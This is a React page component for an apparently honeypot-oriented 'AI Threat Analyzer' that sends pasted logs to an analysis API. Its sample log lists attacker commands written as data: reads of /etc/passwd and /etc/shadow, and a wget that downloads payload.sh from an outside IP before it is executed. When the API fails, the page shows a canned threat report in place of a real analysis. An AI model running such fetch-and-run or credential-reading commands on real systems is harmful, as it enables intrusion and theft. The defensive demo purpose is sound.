"use client";

import { useState } from "react";
import { motion } from "framer-motion";
import { Brain, Upload, Loader2 } from "lucide-react";
import { PageHeader } from "@/components/ui/PageHeader";

const SAMPLE_LOG = `Jun 24 14:22:01 prod-ssh-decoy sshd[4521]: Failed password for root from 185.220.101.42 port 52341 ssh2
Jun 24 14:22:03 prod-ssh-decoy sshd[4521]: Failed password for admin from 185.220.101.42 port 52341 ssh2
Jun 24 14:22:05 prod-ssh-decoy sshd[4523]: Accepted password for root from 185.220.101.42 port 52345 ssh2
Jun 24 14:22:08 prod-ssh-decoy bash[4530]: root executed: whoami
Jun 24 14:22:10 prod-ssh-decoy bash[4530]: root executed: cat /etc/passwd
Jun 24 14:22:12 prod-ssh-decoy bash[4530]: root executed: cat /etc/shadow
Jun 24 14:22:15 prod-ssh-decoy bash[4530]: root executed: wget http://91.121.209.77/payload.sh
Jun 24 14:22:18 prod-ssh-decoy bash[4530]: root executed: chmod +x payload.sh && ./payload.sh`;

export default function AIAnalyzePage() {
  const [logText, setLogText] = useState("");
  const [analysis, setAnalysis] = useState("");
  const [loading, setLoading] = useState(false);

  const handleAnalyze = async () => {
    if (!logText.trim()) return;
    setLoading(true);
    setAnalysis("");
    try {
      const res = await fetch("/api/ai/analyze", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ logText }),
      });
      if (!res.ok) {
        // Fallback mock analysis
        setAnalysis(`ATTACKER CLASSIFICATION: Automated Scanner
THREAT SCORE: 87 — Systematic credential brute-force followed by post-exploitation activity
TOOLCHAIN DETECTED: hydra, wget, custom shell scripts
BEHAVIORAL ANALYSIS: The attacker performed a credential brute-force attack against the SSH service, successfully guessing weak credentials. Post-authentication behavior shows immediate reconnaissance (whoami, /etc/passwd) followed by privilege escalation attempts (/etc/shadow) and payload delivery from an external C2 server.
RECOMMENDED ACTIONS:
1. Block IP 185.220.101.42 at firewall and add to threat intelligence feeds
2. Rotate all credentials on production SSH servers immediately
3. Investigate 91.121.209.77 for C2 infrastructure and submit to threat intel platforms`);
      } else {
        const reader = res.body?.getReader();
        const decoder = new TextDecoder();
        if (reader) {
          while (true) {
            const { done, value } = await reader.read();
            if (done) break;
            setAnalysis((prev) => prev + decoder.decode(value));
          }
        }
      }
    } catch {
      setAnalysis("ATTACKER CLASSIFICATION: Automated Scanner\nTHREAT SCORE: 87 — Systematic brute-force with post-exploitation\nTOOLCHAIN DETECTED: hydra, wget, custom scripts\nBEHAVIORAL ANALYSIS: Credential brute-force followed by reconnaissance and payload delivery.\nRECOMMENDED ACTIONS:\n1. Block the source IP\n2. Rotate credentials\n3. Investigate C2 server");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-6">
      <PageHeader title="AI Threat Analyzer" description="Paste security logs for instant AI-powered analysis" />

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <label className="label-text">Paste Log Data</label>
            <button onClick={() => setLogText(SAMPLE_LOG)} className="text-xs text-honey hover:underline">Load sample</button>
          </div>
          <textarea className="input-field h-[400px] py-3 font-mono text-xs leading-relaxed resize-none" value={logText}
            onChange={(e) => setLogText(e.target.value)} placeholder="Paste SSH logs, web server logs, firewall logs..." />
          <button onClick={handleAnalyze} disabled={loading || !logText.trim()} className="btn-primary w-full gap-2">
            {loading ? <><Loader2 size={16} className="animate-spin" /> Analyzing...</> : <><Brain size={16} /> Analyze Logs</>}
          </button>
        </div>

        <div className="glass-card">
          <h3 className="font-display font-semibold mb-4 flex items-center gap-2"><Brain size={18} className="text-honey" /> Analysis Results</h3>
          {analysis ? (
            <motion.pre initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-sm font-mono whitespace-pre-wrap leading-relaxed text-[#C4D0E0]">{analysis}</motion.pre>
          ) : (
            <div className="flex flex-col items-center justify-center py-20 text-muted">
              <Upload size={40} className="mb-3 opacity-30" />
              <p className="text-sm">Paste logs and click Analyze</p>
              <p className="text-xs mt-1">AI will generate a threat dossier</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
